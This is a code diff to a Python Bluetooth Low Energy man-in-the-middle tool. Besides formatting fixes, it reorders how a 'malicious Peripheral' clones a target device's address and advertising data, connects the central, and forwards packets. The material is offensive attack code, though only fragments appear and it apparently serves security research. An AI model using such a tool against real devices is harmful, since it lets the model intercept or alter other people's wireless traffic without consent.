@@ -42,7 +42,7 @@ class Mitm:
         peripheral_addr_type=1,
         central_addr=None,
         central_addr_type=0,
-        devids = [0,1]
+        devids=[0, 1],
     ):
         self.peripheral = Device(
             id=devids[0],
@@ -51,7 +51,10 @@ class Mitm:
             addr_type=peripheral_addr_type,
         )
         self.central = Device(
-            id=devids[1], role=BLE_ROLE_CENTRAL, addr=central_addr, addr_type=central_addr_type
+            id=devids[1],
+            role=BLE_ROLE_CENTRAL,
+            addr=central_addr,
+            addr_type=central_addr_type,
         )
 
         self.waiting_msg_from = None
@@ -168,13 +171,9 @@ async def main(mitm: Mitm):
 
     # Start advertising with malicious Peripheral and wait for the connection
 
-    mitm.central.connect(mitm.peripheral.addr, mitm.peripheral.addr_type)
-
     # prph_addr = prph_addr[:-1] + "7"
-
-    mitm.peripheral.set_peripheral_mode(
-        addr=mitm.peripheral.addr, addr_type=prph_addr_type, adv_data=adv_data
-    )
+    mitm.peripheral.stop_advertising()
+    mitm.peripheral.start_advertising()
 
     # TODO: maybe async this to start pairing in the background once the connection is established
 
@@ -227,8 +226,10 @@ if __name__ == "__main__":
     mitm = Mitm(
         central_addr=args.central_addr,
         central_addr_type=addr_type_map[args.central_addr_type],
-        devids=dev_ids
+        devids=dev_ids,
     )
+
+    # input("Disconnect your devices and then press any key to proceed...")
 
     # Enable or disable packets passthru
     mitm.transparent = True
@@ -241,15 +242,19 @@ if __name__ == "__main__":
         bname=args.peripheral_name, get_data=True
     )
 
+    print("Gathered Peripheral target data")
+
     mitm.peripheral.addr = prph_addr
     mitm.peripheral.addr_type = prph_addr_type
 
     mitm.peripheral.initialize()
+    print("Initialized peripheral")
+    mitm.peripheral.set_adv_data(prph_addr, prph_addr_type, adv_data)
 
     mitm.peripheral.forwarding = True
     mitm.central.forwarding = True
 
-    input("Press any key to start the attack...")
+    mitm.central.connect(mitm.peripheral.addr, mitm.peripheral.addr_type)
 
     # Start background listening tasks
     tasks = asyncio.run(main(mitm))
